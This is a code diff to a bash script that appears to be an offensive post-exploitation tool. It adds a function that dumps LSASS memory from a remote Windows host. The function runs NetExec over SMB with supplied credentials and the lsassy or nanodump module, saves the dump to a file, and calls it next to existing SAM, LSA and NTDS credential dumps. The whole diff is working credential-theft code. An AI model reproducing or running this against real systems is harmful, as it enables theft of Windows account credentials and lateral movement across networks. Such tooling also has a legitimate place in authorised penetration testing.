@@ -174,6 +174,38 @@ dump_lsa() {
   fi
 }
 
+# Function to execute LSASS dump
+dump_lsass() {
+  local method="${1:-lsassy}"  # Default to "lsassy" if no method is provided
+  local output_file="$DUMP_DIR/LSASS_dump_${TARGET_HOST}.dmp"
+  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD'"
+
+  # Append the appropriate module to the command based on the method
+  case "$method" in
+    nanodump)
+      cmd+=" -M nanodump"
+      ;;
+    lsassy)
+      cmd+=" -M lsassy"
+      ;;
+    *)
+      echo -e "${RED}[ERROR]${RESET} Invalid method '$method' for LSASS dump. Use 'lsassy' or 'nanodump'."
+      return 1
+      ;;
+  esac
+
+  add_log "Starting LSASS dump using $method..."
+  if run_command "$cmd > '$output_file' 2>/dev/null"; then
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSASS dump completed successfully using $method. Output saved to $output_file"
+    log_operation "LSASS" "success" "\"file_path\": \"$output_file\", \"method\": \"$method\""
+    add_log "LSASS dump saved to $output_file"
+  else
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSASS dump failed using $method. Check permissions or connectivity."
+    log_operation "LSASS" "failed" "\"error\": \"Failed to dump LSASS using $method\""
+    add_warning "Failed to dump LSASS on target $TARGET_HOST using $method"
+  fi
+}
+
 # Function to execute NTDS dump using ntdsutil
 dump_ntds() {
   local output_file="$DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
@@ -200,6 +232,9 @@ dump_sam
 
 # Execute LSA dump
 dump_lsa
+
+# Execute LSASS dump
+dump_lsass
 
 # Execute NTDS dump (ntdsutil method)
 dump_ntds
